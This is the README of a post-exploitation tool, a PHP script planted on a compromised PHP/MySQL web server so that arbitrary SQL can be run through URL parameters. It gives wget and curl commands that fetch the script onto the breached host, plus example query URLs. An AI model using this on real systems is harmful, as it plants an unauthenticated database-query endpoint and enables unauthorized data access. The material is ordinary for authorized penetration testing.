# MySQL-Web-Query

There are cases (in a post-exploitation scenario) where, after committing a web application and getting the shell, it is not possible to interact with MySQL due to the limitations of interaction from the shell that was obtained.

In this case **MySQL-Web-Query** can be useful.

### :hammer_and_wrench: Requirements

The compromised web server is required to use PHP technology and MySQL as DBMS.

### 📋 How to use

Transfer the script to the web server in a directory accessible by the browser:
```
wget https://raw.githubusercontent.com/caique-garbim/MySQL-Web-Query/main/query.php
```
or
```
curl https://raw.githubusercontent.com/caique-garbim/MySQL-Web-Query/main/query.php > query.php
```
<br>

You can query the database through parameters inserted in the URL. **db** (database) and **q** (query) parameters must be informed. Examples:
```
http://web_server/query.php?db=mysql&q=select user();
```
![image](https://user-images.githubusercontent.com/76706456/178148420-53e2f3bb-6071-486f-900a-6e0d6f7e0582.png)
```
http://web_server/query.php?db=mysql&q=show tables;
```
![image](https://user-images.githubusercontent.com/76706456/178148558-2921f6ad-45f9-446e-95c0-7b0ee3e9f0b0.png)
